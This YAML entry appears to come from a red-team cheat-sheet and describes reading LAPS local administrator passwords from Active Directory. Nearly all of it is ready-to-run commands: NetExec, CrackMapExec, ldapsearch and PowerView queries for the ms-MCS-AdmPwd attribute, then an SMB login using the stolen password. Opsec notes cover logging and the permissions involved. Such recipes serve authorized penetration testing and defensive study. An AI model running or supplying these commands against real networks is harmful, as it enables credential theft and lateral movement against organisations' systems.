name: ReadLAPSPassword
description: Read the local administrator password from LAPS
commands:
- '# NetExec (recommended - actively maintained)'
- nxc ldap <DC_IP> -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -M laps
- ''
- '# NetExec - target specific computer'
- nxc ldap <DC_IP> -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -M laps -o COMPUTER=<COMPUTER>
- ''
- '# CrackMapExec (legacy)'
- crackmapexec ldap <DC_IP> -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' --module laps
- ''
- '# Impacket ldapsearch'
- ldapsearch -H ldap://<DC_IP> -D '<YOUR_USER>@<DOMAIN>' -w '<YOUR_PASSWORD>' -b 'DC=<DOMAIN>,DC=local' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
- ''
- '# PowerView'
- Get-DomainComputer -Identity <COMPUTER> -Properties ms-mcs-admpwd
- ''
- '# Use retrieved password'
- nxc smb <COMPUTER> -u 'Administrator' -p '<LAPS_PASSWORD>' --local-auth
opsec:
- LAPS password reads are logged in AD if auditing is enabled
- Reading LAPS attribute requires explicit permission grants
references:
- https://www.thehacker.recipes/ad/movement/credentials/dumping/laps
